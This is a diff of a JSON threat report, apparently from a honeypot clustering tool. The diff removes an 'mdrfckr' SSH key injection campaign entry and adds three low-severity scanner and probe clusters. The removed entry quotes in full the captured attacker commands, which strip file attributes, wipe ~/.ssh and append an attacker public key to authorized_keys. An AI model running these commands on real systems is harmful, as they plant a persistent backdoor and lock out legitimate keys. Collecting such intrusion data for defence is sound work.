@@ -1,96 +1,106 @@
 {
-  "generated_at": "2026-07-28T19:37:57.670289+00:00",
-  "total_sessions_with_commands": 2,
-  "total_clusters": 1,
-  "campaign_clusters": 1,
-  "singleton_clusters": 0,
-  "highest_severity": "HIGH",
-  "active_campaigns": [
-    {
-      "cluster_id": "CLU-001",
-      "name": "mdrfckr SSH Key Injection",
-      "severity": "HIGH",
-      "session_count": 2,
-      "unique_ip_count": 2,
-      "ttps": [
-        "T1021.004",
-        "T1078",
-        "T1070",
-        "T1140",
-        "T1105"
-      ]
-    }
-  ],
+  "generated_at": "2026-07-28T21:11:46.480223+00:00",
+  "total_sessions_with_commands": 3,
+  "total_clusters": 3,
+  "campaign_clusters": 0,
+  "singleton_clusters": 3,
+  "highest_severity": "NONE",
+  "active_campaigns": [],
   "clusters": [
     {
       "cluster_id": "CLU-001",
-      "is_campaign": true,
-      "campaign_name": "mdrfckr SSH Key Injection",
-      "campaign_severity": "HIGH",
-      "campaign_description": "Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.",
-      "matched_campaigns": [
-        {
-          "name": "mdrfckr SSH Key Injection",
-          "ttps": [
-            "T1021.004",
-            "T1078",
-            "T1105"
-          ],
-          "severity": "HIGH",
-          "description": "Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.",
-          "pattern_hits": 3,
-          "pattern_total": 3
-        }
-      ],
-      "session_count": 2,
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 1,
       "unique_ips": [
-        "20.243.176.67",
-        "118.196.118.181"
+        "192.161.49.2"
       ],
-      "unique_ip_count": 2,
-      "sequence_hash": "98af0db988d5971c",
-      "ttps": [
-        {
-          "id": "T1021.004",
-          "name": "Remote Services: SSH"
-        },
-        {
-          "id": "T1078",
-          "name": "Valid Accounts"
-        },
-        {
-          "id": "T1070",
-          "name": "Indicator Removal"
-        },
-        {
-          "id": "T1140",
-          "name": "Deobfuscate/Decode Files"
-        },
-        {
-          "id": "T1105",
-          "name": "T1105"
-        }
-      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "c77277c8368bde74",
+      "ttps": [],
       "representative_commands": [
-        "cd ~; chattr -ia .ssh; lockr -ia .ssh",
-        "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
+        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0",
+        "Accept: */*",
+        "Connection: close"
       ],
       "members": [
         {
-          "session_id": "IR-98c2693a0444",
-          "src_ip": "20.243.176.67",
-          "country": "JP",
-          "isp": "Microsoft Corporation",
-          "command_count": 2,
-          "timestamp": "2026-07-28T18:02:53.521600Z"
-        },
+          "session_id": "IR-6d5ace5db326",
+          "src_ip": "192.161.49.2",
+          "country": "US",
+          "isp": "HostPapa",
+          "command_count": 3,
+          "timestamp": "2026-07-28T20:40:55.082880Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-002",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 1,
+      "unique_ips": [
+        "35.203.210.100"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "49efc5eb7bb5604b",
+      "ttps": [
         {
-          "session_id": "IR-802145ba36c2",
-          "src_ip": "118.196.118.181",
-          "country": "CN",
-          "isp": "Beijing Volcano Engine Technology Co., Ltd.",
+          "id": "T1083",
+          "name": "File & Directory Discovery"
+        }
+      ],
+      "representative_commands": [
+        "User-Agent: Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity",
+        "Accept-Encoding: gzip"
+      ],
+      "members": [
+        {
+          "session_id": "IR-c572acf9d0d8",
+          "src_ip": "35.203.210.100",
+          "country": "GB",
+          "isp": "Google LLC",
           "command_count": 2,
-          "timestamp": "2026-07-28T18:07:46.001455Z"
+          "timestamp": "2026-07-28T19:34:40.782731Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-003",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 1,
+      "unique_ips": [
+        "111.228.24.134"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "6fa4c8ac58e7a1d9",
+      "ttps": [
+        {
+          "id": "T1082",
+          "name": "System Information Discovery"
+        }
+      ],
+      "representative_commands": [
+        "uname -s -m"
+      ],
+      "members": [
+        {
+          "session_id": "IR-bac79410dd3b",
+          "src_ip": "111.228.24.134",
+          "country": "CN",
+          "isp": "eleven street,No. 18 Institute of Jingdong headquarters",
+          "command_count": 1,
+          "timestamp": "2026-07-28T20:04:18.928606Z"
         }
       ]
     }
